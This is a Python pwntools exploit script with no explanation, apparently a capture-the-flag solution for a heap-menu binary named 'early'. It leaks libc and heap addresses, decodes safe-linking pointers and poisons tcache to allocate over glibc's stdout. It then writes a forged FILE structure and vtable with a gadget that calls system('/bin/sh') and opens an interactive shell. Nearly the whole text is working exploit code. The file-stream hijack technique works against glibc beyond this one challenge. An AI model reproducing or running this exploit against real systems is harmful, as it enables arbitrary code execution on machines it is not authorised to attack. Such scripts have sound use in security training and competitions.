from pwn import *
import sys

context.binary = ELF('./early')  # Change this to your binary
elf = context.binary
#context.terminal = ['tmux', 'splitw', '-h']  # Or ['gnome-terminal', '-e'] if not using tmux
context.log_level = 'warning'  # Adjust as needed
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def start():
    if len(sys.argv) == 2 and sys.argv[1] == 'gdb':
        p = process(context.binary.path)
        gdb.attach(p, gdbscript='''
            b *main+382
        ''')
        return p
    elif len(sys.argv) == 3:
        ip = sys.argv[1]
        port = int(sys.argv[2])
        return remote(ip, port)
    else:
        return process(context.binary.path)


p = start()


def add(idx, size, payload):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'?\n', str(idx).encode())
    p.sendlineafter(b'?\n', str(size).encode())
    p.sendafter(b':\n', payload)

def edit(idx, payload):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'?\n', str(idx).encode())
    p.sendafter(b':\n', payload)

def view(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'?\n', str(idx).encode())

def resize(idx, size):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'?\n', str(idx).encode())
    p.sendlineafter(b'?\n', str(size).encode())

def delete(idx):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'?\n', str(idx).encode())


def defuscate(x,l=64):
    p = 0
    for i in range(l*4,0,-4): # 16 nibble
        v1 = (x & (0xf << i )) >> i
        v2 = (p & (0xf << i+12 )) >> i+12
        p |= (v1 ^ v2) << i
    return p

def obfuscate(p, adr):
    return p^(adr>>12)


add(0, 0x450, b'A'*0x450)
add(1, 0xf0, b'A'*0xf0)
add(2, 0xf0, b'A'*0xf0)


resize(0, 0x450)
view(0)
leak = u64(p.recvn(6)+b'\x00'*2)
libc.address = leak - 0x203b20
print(f'LEAK: {hex(leak)}')


resize(1, 0x450)
resize(2, 0x450)

view(2)
heap = defuscate(u64(p.recvn(6)+b'\x00'*2))
print(f'HEAP: {hex(heap)}')

target = obfuscate(libc.sym['_IO_2_1_stdout_'], heap)
edit(2, p64(target)+b'\x00'*(0xf0-0x8))
#delete(1)

add(3, 0xf0, b'A'*0xf0)

# some constants
stdout_lock = libc.address + 0x205710	# _IO_stdfile_1_lock  (symbol not exported)
stdout = libc.sym['_IO_2_1_stdout_']
fake_vtable = libc.sym['_IO_wfile_jumps']-0x18
# our gadget
gadget = libc.address + 0x00000000001724f0 # add rdi, 0x10 ; jmp rcx

fake = FileStructure(0)
fake.flags = 0x3b01010101010101
fake._IO_read_end=libc.sym['system']		# the function that we will call: system()
fake._IO_save_base = gadget
fake._IO_write_end=u64(b'/bin/sh\x00')	# will be at rdi+0x10
fake._lock=stdout_lock
fake._codecvt= stdout + 0xb8
fake._wide_data = stdout+0x200		# _wide_data just need to points to empty zone
fake.unknown2=p64(0)*2+p64(stdout+0x20)+p64(0)*3+p64(fake_vtable)

#0x205710
add(4, 0xf0, bytes(fake)+b'\x00'*8)

p.interactive()
